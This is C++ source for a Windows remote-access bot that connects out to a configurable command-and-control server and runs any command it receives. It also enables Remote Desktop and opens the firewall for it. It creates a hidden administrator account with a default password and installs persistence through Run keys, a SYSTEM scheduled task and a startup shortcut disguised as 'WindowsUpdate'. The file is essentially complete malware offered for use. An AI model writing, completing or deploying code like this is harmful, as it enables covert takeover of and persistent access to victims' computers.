// leverup_bot_fixed.cpp - COMPILABLE VERSION WITH PRIVILEGE ESCALATION
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <shellapi.h>
#include <string>
#include <thread>
#include <atomic>
#include <sstream>
#include <fstream>
#include <iostream>
#include <shlobj.h>

// Add this pragma for the shell32 library
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")

#define BUFFER_SIZE 4096

// Configuration
std::string C2_SERVER_IP = "192.168.1.5";  // Change this
int C2_SERVER_PORT = 8080;

std::atomic<bool> g_running(true);
SOCKET g_socket = INVALID_SOCKET;

// ==================== UTILITY FUNCTIONS ====================

bool isRunningAsAdmin() {
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD dwSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
            CloseHandle(hToken);
            return elevation.TokenIsElevated != 0;
        }
        CloseHandle(hToken);
    }
    return false;
}

std::string executeCommand(const std::string& cmd) {
    char buffer[4096];
    std::string result = "";
    FILE* pipe = _popen(cmd.c_str(), "r");
    
    if (pipe) {
        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
            result += buffer;
        }
        _pclose(pipe);
    }
    
    return result;
}

std::string getWindowsVersion() {
    HKEY hKey;
    DWORD dwType = REG_SZ;
    char buffer[256];
    DWORD dwSize = sizeof(buffer);
    
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, "ProductName", NULL, &dwType, (LPBYTE)buffer, &dwSize) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return std::string(buffer);
        }
        RegCloseKey(hKey);
    }
    
    // Fallback to version numbers
    OSVERSIONINFOEXA os;
    os.dwOSVersionInfoSize = sizeof(os);
    GetVersionExA((OSVERSIONINFOA*)&os);
    
    if (os.dwMajorVersion == 10) {
        return "Windows 10";
    } else if (os.dwMajorVersion == 6) {
        if (os.dwMinorVersion == 3) return "Windows 8.1";
        if (os.dwMinorVersion == 2) return "Windows 8";
        if (os.dwMinorVersion == 1) return "Windows 7";
        if (os.dwMinorVersion == 0) return "Windows Vista";
    } else if (os.dwMajorVersion == 5) {
        if (os.dwMinorVersion == 2) return "Windows XP 64-bit or Server 2003";
        if (os.dwMinorVersion == 1) return "Windows XP";
    }
    
    return "Windows " + std::to_string(os.dwMajorVersion) + "." + std::to_string(os.dwMinorVersion);
}

std::string getArchitecture() {
    SYSTEM_INFO sysInfo;
    GetNativeSystemInfo(&sysInfo);
    
    switch (sysInfo.wProcessorArchitecture) {
        case PROCESSOR_ARCHITECTURE_AMD64:
            return "x64";
        case PROCESSOR_ARCHITECTURE_INTEL:
            return "x86";
        case PROCESSOR_ARCHITECTURE_ARM:
            return "ARM";
        case PROCESSOR_ARCHITECTURE_ARM64:
            return "ARM64";
        case PROCESSOR_ARCHITECTURE_IA64:
            return "IA64";
        default:
            return "Unknown";
    }
}

std::string getSystemInfo() {
    std::stringstream ss;
    char buffer[256];
    
    // Computer name
    DWORD size = sizeof(buffer);
    GetComputerNameA(buffer, &size);
    ss << "Computer: " << buffer << "\n";
    
    // Username
    GetUserNameA(buffer, &size);
    ss << "User: " << buffer << "\n";
    
    // Windows version (corrected)
    ss << "OS: " << getWindowsVersion() << "\n";
    
    // Architecture
    ss << "Arch: " << getArchitecture() << "\n";
    
    // Admin status
    ss << "Admin: " << (isRunningAsAdmin() ? "Yes" : "No") << "\n";
    
    // IP address (simplified)
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    struct hostent* host = gethostbyname(hostname);
    if (host != NULL) {
        struct in_addr addr;
        memcpy(&addr, host->h_addr_list[0], sizeof(struct in_addr));
        ss << "IP: " << inet_ntoa(addr) << "\n";
    }
    
    return ss.str();
}

// ==================== COMMAND HANDLERS ====================

std::string handleSysinfo() {
    return "[SYSTEM_INFO]\n" + getSystemInfo() + "[END]\n";
}

std::string handleEnableRDP() {
    std::string result = "[RDP]\n";
    
    // Simple RDP enable using commands
    system("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f");
    system("netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes");
    
    result += "RDP Enabled\n";
    result += "Connect with: mstsc /v:<IP_ADDRESS>\n";
    result += "[END]\n";
    
    return result;
}

std::string handleLaunch(const std::string& appName) {
    std::string result = "[LAUNCH]\n";
    result += "Attempting to launch: " + appName + "\n";
    result += "[ADMIN] Running as: " + std::string(isRunningAsAdmin() ? "Administrator" : "Standard User") + "\n";
    
    // First try: Use ShellExecute with SW_SHOW to make it visible
    INT_PTR shellResult = (INT_PTR)ShellExecuteA(NULL, "open", appName.c_str(), NULL, NULL, SW_SHOW);
    
    if (shellResult > 32) {
        result += "Successfully launched via ShellExecute\n";
        result += "Return code: " + std::to_string(shellResult) + "\n";
    } else {
        result += "ShellExecute failed. Error code: " + std::to_string(shellResult) + "\n";
        
        // Second try: Use cmd start command
        std::string cmd = "start \"\" \"" + appName + "\"";
        result += "Trying command: " + cmd + "\n";
        
        int ret = system(cmd.c_str());
        if (ret == 0) {
            result += "Start command succeeded\n";
        } else {
            result += "Start command failed\n";
            
            // Third try: Try different ShellExecute flags
            shellResult = (INT_PTR)ShellExecuteA(NULL, "open", appName.c_str(), NULL, NULL, SW_SHOWNORMAL);
            if (shellResult > 32) {
                result += "Successfully launched with SW_SHOWNORMAL\n";
            } else {
                result += "All launch methods failed\n";
                result += "Note: Application may be running in background\n";
            }
        }
    }
    
    result += "[END]\n";
    return result;
}

std::string handleDir() {
    std::string cmd = "dir";
    std::string result = "[COMMAND] Executing: " + cmd + "\n";
    result += "[ADMIN] Running as: " + std::string(isRunningAsAdmin() ? "Administrator" : "Standard User") + "\n";
    result += executeCommand(cmd);
    return result;
}

std::string handleKill(const std::string& pid) {
    std::string cmd = "taskkill /PID " + pid + " /F";
    std::string result = "[COMMAND] Executing: " + cmd + "\n";
    result += "[ADMIN] Running as: " + std::string(isRunningAsAdmin() ? "Administrator" : "Standard User") + "\n";
    result += executeCommand(cmd);
    return result;
}

std::string handleShell() {
    std::string result = "[SHELL]\n";
    result += "Starting shell...\n";
    result += "[ADMIN] Running as: " + std::string(isRunningAsAdmin() ? "Administrator" : "Standard User") + "\n";
    result += "Shell ready for commands\n";
    result += "[END]\n";
    return result;
}

// ==================== PRIVILEGE ESCALATION ====================

std::string handlePrivEsc(const std::string& username = "", const std::string& password = "") {
    std::string result = "[PRIVESC]\n";
    result += "Attempting privilege escalation - Add user to Administrators group\n";
    result += "[ADMIN] Running as: " + std::string(isRunningAsAdmin() ? "Administrator" : "Standard User") + "\n";
    
    // Check if we're running as admin
    if (!isRunningAsAdmin()) {
        result += "ERROR: Not running as Administrator. Cannot add user.\n";
        result += "[END]\n";
        return result;
    }
    
    // Generate username and password if not provided
    std::string newUser = username.empty() ? "SystemHelper" : username;
    std::string newPass = password.empty() ? "P@ssw0rd123!" : password;
    
    result += "Username: " + newUser + "\n";
    result += "Password: " + newPass + "\n";
    
    // Method 1: Using net commands
    result += "\n=== Method 1: Net Commands ===\n";
    
    // Add user
    std::string addUserCmd = "net user " + newUser + " " + newPass + " /add";
    result += "Command: " + addUserCmd + "\n";
    result += "Output: " + executeCommand(addUserCmd);
    
    // Add to administrators group
    std::string addToAdminCmd = "net localgroup administrators " + newUser + " /add";
    result += "Command: " + addToAdminCmd + "\n";
    result += "Output: " + executeCommand(addToAdminCmd);
    
    // Method 2: Using PowerShell (for modern Windows)
    result += "\n=== Method 2: PowerShell ===\n";
    std::string psCmd = "powershell -Command \"& {";
    psCmd += "try {";
    psCmd += "    $pass = ConvertTo-SecureString '" + newPass + "' -AsPlainText -Force; ";
    psCmd += "    New-LocalUser -Name '" + newUser + "' -Password $pass -ErrorAction Stop; ";
    psCmd += "    Add-LocalGroupMember -Group 'Administrators' -Member '" + newUser + "' -ErrorAction Stop; ";
    psCmd += "    Write-Output '[SUCCESS] User created and added to Administrators group'; ";
    psCmd += "} catch { Write-Output ('[ERROR] ' + $_.Exception.Message) }";
    psCmd += "}\"";
    
    result += "Command: powershell ...\n";
    result += "Output: " + executeCommand(psCmd);
    
    // Verify the user was created
    result += "\n=== Verification ===\n";
    std::string verifyUserCmd = "net user " + newUser;
    result += "Command: " + verifyUserCmd + "\n";
    result += "Output: " + executeCommand(verifyUserCmd);
    
    // Verify group membership
    std::string verifyGroupCmd = "net localgroup administrators";
    result += "\nCommand: " + verifyGroupCmd + "\n";
    std::string groupOutput = executeCommand(verifyGroupCmd);
    result += "Output: " + groupOutput;
    
    if (groupOutput.find(newUser) != std::string::npos) {
        result += "\n[SUCCESS] User '" + newUser + "' successfully added to Administrators group!\n";
        result += "You can now login with these credentials.\n";
    } else {
        result += "\n[WARNING] User may not have been added to Administrators group.\n";
    }
    
    result += "[END]\n";
    return result;
}

std::string handlePowerShell(const std::string& command) {
    std::string result = "[POWERSHELL]\n";
    result += "Running PowerShell command as: " + std::string(isRunningAsAdmin() ? "Administrator" : "Standard User") + "\n";
    result += "Command: " + command + "\n";
    result += "Output:\n";
    
    // Check if we should run with -ExecutionPolicy Bypass to avoid restrictions
    std::string fullCommand;
    if (command.find(" -") == std::string::npos) {
        // Simple command, add bypass flag
        fullCommand = "powershell -ExecutionPolicy Bypass -Command \"" + command + "\"";
    } else {
        // Command already has flags
        fullCommand = "powershell " + command;
    }
    
    result += executeCommand(fullCommand);
    result += "[END]\n";
    return result;
}

// ==================== PERSISTENCE FUNCTIONS ====================

std::string getCurrentExecutablePath() {
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    return std::string(buffer);
}

std::string handlePersistence() {
    std::string result = "[PERSISTENCE]\n";
    
    // Method 1: Add to Current User Run key
    std::string currentPath = getCurrentExecutablePath();
    
    // HKCU Run key
    std::string regCmd = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"WindowsUpdate\" /t REG_SZ /d \"";
    regCmd += currentPath + "\" /f";
    system(regCmd.c_str());
    
    result += "Added to HKCU Run: " + regCmd + "\n";
    
    // Method 2: Create scheduled task
    std::string taskCmd = "schtasks /create /tn \"WindowsUpdateService\" /tr \"";
    taskCmd += currentPath + "\" /sc onlogon /ru \"System\" /f";
    system(taskCmd.c_str());
    
    result += "Created scheduled task: " + taskCmd + "\n";
    
    // Method 3: Startup folder
    char username[256];
    DWORD username_len = 256;
    GetUserNameA(username, &username_len);
    
    // Build startup path manually
    std::string startupPath = "C:\\Users\\" + std::string(username) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.lnk";
    
    // Create shortcut using a batch file that creates a VBS script
    std::ofstream batFile("create_shortcut.bat");
    batFile << "@echo off\n";
    batFile << "echo Set oWS = WScript.CreateObject(\"WScript.Shell\") > temp.vbs\n";
    batFile << "echo sLinkFile = \"" << startupPath << "\" >> temp.vbs\n";
    batFile << "echo Set oLink = oWS.CreateShortcut(sLinkFile) >> temp.vbs\n";
    batFile << "echo oLink.TargetPath = \"" << currentPath << "\" >> temp.vbs\n";
    batFile << "echo oLink.Save >> temp.vbs\n";
    batFile << "cscript //nologo temp.vbs\n";
    batFile << "del temp.vbs\n";
    batFile.close();
    
    system("create_shortcut.bat");
    system("del create_shortcut.bat");
    
    result += "Added to Startup folder: " + startupPath + "\n";
    result += "[END]\n";
    
    return result;
}


// ==================== NETWORK FUNCTIONS ====================

bool connectToServer() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return false;
    }
    
    g_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (g_socket == INVALID_SOCKET) {
        WSACleanup();
        return false;
    }
    
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(C2_SERVER_PORT);
    serverAddr.sin_addr.s_addr = inet_addr(C2_SERVER_IP.c_str());
    
    if (connect(g_socket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(g_socket);
        WSACleanup();
        return false;
    }
    
    return true;
}

void sendResponse(const std::string& data) {
    if (g_socket != INVALID_SOCKET) {
        send(g_socket, data.c_str(), data.length(), 0);
    }
}

void handleCommand(const std::string& command) {
    std::string response;
    
    if (command == "sysinfo") {
        response = handleSysinfo();
    }
    else if (command == "enablerdp") {
        response = handleEnableRDP();
    }
    else if (command == "dir") {
        response = handleDir();
    }
    else if (command.find("kill ") == 0) {
        std::string pid = command.substr(5);
        response = handleKill(pid);
    }
    else if (command == "shell") {
        response = handleShell();
    }
    else if (command == "persist") {
        response = handlePersistence();
    }
    else if (command.find("powershell ") == 0) {
        std::string psCommand = command.substr(10); // Remove "powershell " prefix
        response = handlePowerShell(psCommand);
    }
    else if (command.find("launch ") == 0) {
        std::string appName = command.substr(7);
        response = handleLaunch(appName);
    }
    else if (command == "privesc") {  // NEW: Privilege escalation command
        response = handlePrivEsc();
    }
    else if (command.find("privesc ") == 0) {  // NEW: With parameters
        std::string params = command.substr(8);
        size_t spacePos = params.find(' ');
        if (spacePos != std::string::npos) {
            std::string username = params.substr(0, spacePos);
            std::string password = params.substr(spacePos + 1);
            response = handlePrivEsc(username, password);
        } else {
            // Only username provided
            response = handlePrivEsc(params, "");
        }
    }
    else if (command == "help") {
        response = "[HELP] Available commands: sysinfo, enablerdp, dir, kill <pid>, launch <app/file>, privesc [username] [password], shell, persist, help, exit\n";
    }
    else if (command == "exit") {
        response = "[+] Goodbye\n";
        g_running = false;
    }
    else {
        // Execute as shell command
        std::string cmd = command;
        response = "[COMMAND] Executing: " + cmd + "\n";
        response += "[ADMIN] Running as: " + std::string(isRunningAsAdmin() ? "Administrator" : "Standard User") + "\n";
        response += executeCommand(cmd);
        if (response.find_last_of('\n') != response.length() - 1) {
            response += "\n";
        }
    }
    
    sendResponse(response);
}

// ==================== MAIN LOOP ====================

void botLoop() {
    // Send initial system info
    std::string sysinfo = handleSysinfo();
    sendResponse(sysinfo);
    
    char buffer[BUFFER_SIZE];
    
    while (g_running) {
        int bytes = recv(g_socket, buffer, BUFFER_SIZE - 1, 0);
        
        if (bytes > 0) {
            buffer[bytes] = '\0';
            std::string command(buffer);
            
            // Remove trailing newline
            if (!command.empty() && command.back() == '\n') {
                command.pop_back();
            }
            if (!command.empty() && command.back() == '\r') {
                command.pop_back();
            }
            
            handleCommand(command);
        }
        else if (bytes == 0) {
            // Server disconnected
            break;
        }
        
        Sleep(100);
    }
}

// ==================== ENTRY POINT ====================

int main(int argc, char* argv[]) {
    std::cout << "[*] LeverUp Bot Starting...\n";
    std::cout << "[*] Server: " << C2_SERVER_IP << ":" << C2_SERVER_PORT << "\n";
    std::cout << "[*] Running as: " << (isRunningAsAdmin() ? "Administrator" : "Standard User") << "\n";
    
    // Parse command line arguments
    if (argc >= 3) {
        C2_SERVER_IP = argv[1];
        C2_SERVER_PORT = atoi(argv[2]);
    }
    
    while (g_running) {
        if (connectToServer()) {
            std::cout << "[+] Connected to C2 server\n";
            botLoop();
            
            if (g_running) {
                std::cout << "[-] Disconnected, reconnecting in 10 seconds...\n";
                Sleep(10000);
            }
        } else {
            std::cout << "[-] Connection failed, retrying in 10 seconds...\n";
            Sleep(10000);
        }
    }
    
    closesocket(g_socket);
    WSACleanup();
    return 0;
}